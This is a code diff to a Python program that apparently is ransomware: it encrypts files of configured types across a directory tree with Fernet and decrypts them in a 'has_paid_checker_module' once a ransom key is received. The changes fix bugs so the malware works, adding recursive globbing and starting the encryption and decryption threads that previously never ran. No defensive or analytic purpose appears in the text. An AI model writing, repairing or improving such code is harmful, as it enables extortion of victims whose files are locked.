@@ -46,7 +46,7 @@ def get_all_files_in_directory(path):
     1) Use Glob to get all the file and return them in array shape
     :param path: the start path
     """
-    return [f for f in glob.glob(path + '/**/*.{' + os.getenv("FILES_TYPES_TO_ENCRYPT") + '}', flags=glob.BRACE) if
+    return [f for f in glob.glob(path + '/**/*.{' + os.getenv("FILES_TYPES_TO_ENCRYPT") + '}', flags=glob.BRACE | glob.GLOBSTAR) if
             isfile(f)]
 
 
@@ -75,9 +75,11 @@ def main():
         for file in files:
             thread = threading.Thread(target=encrypt_file, args=(file, fernet,))
             threads.append(thread)
+            thread.start()
 
         for thread in threads:
             thread.join()
+
         print("-- END OF ENCRYPTION STEP --")
         # -- ENCRYPT MODULE --
 
@@ -129,9 +131,9 @@ def has_paid_checker_module(computer_id: str):
                 if key:
                     threads = []
                     for file in files:
-                        thread = threading.Thread(target=decrypt_file, args=(file, Fernet(key,)))
+                        thread = threading.Thread(target=decrypt_file, args=(file, Fernet(key, )))
                         threads.append(thread)
-
+                        thread.start()
                     for thread in threads:
                         thread.join()
 
